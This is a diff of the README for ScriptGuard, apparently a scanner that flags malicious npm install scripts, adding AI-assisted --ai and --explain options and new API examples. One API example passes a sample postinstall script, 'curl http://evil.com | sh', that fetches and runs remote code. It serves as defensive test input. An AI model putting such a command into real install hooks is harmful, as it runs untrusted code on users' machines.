@@ -74,8 +74,17 @@ scriptguard scan --no-deobfuscate   # Disable deobfuscation layer
 ### Check a single package.json
 
 ```bash
+# Basic check (regex + AST + deobfuscation)
 scriptguard check ./package.json
+
+# Output as JSON
 scriptguard check ./some-module/package.json --format json
+
+# AI-powered analysis of a single package
+scriptguard check ./package.json --ai
+
+# Plain English explanation of each finding
+scriptguard check ./package.json --explain
 ```
 
 ### List all detection patterns
@@ -89,9 +98,15 @@ scriptguard patterns
 ScriptGuard can use Google Gemini AI to enhance security scans with contextual analysis:
 
 ```bash
-# Enable AI analysis
+# Enable AI analysis on scan
 export GOOGLE_AI_API_KEY=your_key_here
 scriptguard scan --ai
+
+# AI analysis on a single package.json
+scriptguard check ./package.json --ai
+
+# Plain English explanations (--explain auto-enables --ai)
+scriptguard check ./package.json --explain
 
 # Choose analysis depth
 scriptguard scan --ai --ai-mode basic    # Quick false positive filtering
@@ -104,6 +119,8 @@ scriptguard scan --ai --ai-max-tokens 500 --ai-timeout 5000
 # Include remediation recommendations
 scriptguard scan --ai --ai-mitigation
 ```
+
+**`--explain` mode** is designed for the `check` command — instead of structured JSON insights, the AI narrates each finding in plain English: what the script does, why it's flagged, how an attacker could exploit it, and whether it's likely a false positive. Perfect for understanding a package before installing it.
 
 **What AI adds:**
 - ✅ **Reduces false positives** by understanding context (e.g., `process.env.PORT` vs `process.env.AWS_SECRET_KEY`)
@@ -193,11 +210,22 @@ ScriptGuard uses a **4-layer detection pipeline** to catch sophisticated attacks
 ## Programmatic API
 
 ```typescript
-import { scanProject, analyzePackage } from 'scriptguard';
+import { scanProject, scanPackageJson, scanPackageJsonWithAI, analyzePackage } from 'scriptguard';
 
 // Scan an entire project
-const result = scanProject({ path: '.', includeDev: false, minRiskLevel: 'low', format: 'table' });
+const result = await scanProject({ path: '.', includeDev: false, minRiskLevel: 'low', format: 'table' });
 console.log(`Found ${result.totalFindings} findings`);
+
+// Check a single package.json (sync, no AI)
+const checkResult = scanPackageJson('./package.json');
+console.log(checkResult.overallRiskLevel);
+
+// Check a single package.json with AI analysis
+const aiResult = await scanPackageJsonWithAI('./package.json', {
+  enabled: true,
+  mode: 'explain',
+  apiKey: process.env.GOOGLE_AI_API_KEY,
+});
 
 // Analyze a single package's scripts
 const analysis = analyzePackage('my-pkg', '1.0.0', { postinstall: 'curl http://evil.com | sh' });
@@ -506,6 +534,8 @@ scriptguard/
 │       └── deobfuscation.ts  # Deobfuscation engine (NEW)
 ├── tests/
 │   ├── scanner.test.ts     # Vitest test suite
+│   ├── ast.test.ts         # AST and deobfuscation tests
+│   ├── check-ai.test.ts    # Check --ai and --explain tests
 │   └── fixtures/           # Sample package.json files
 └── dist/                   # Compiled JavaScript (generated)
 ```
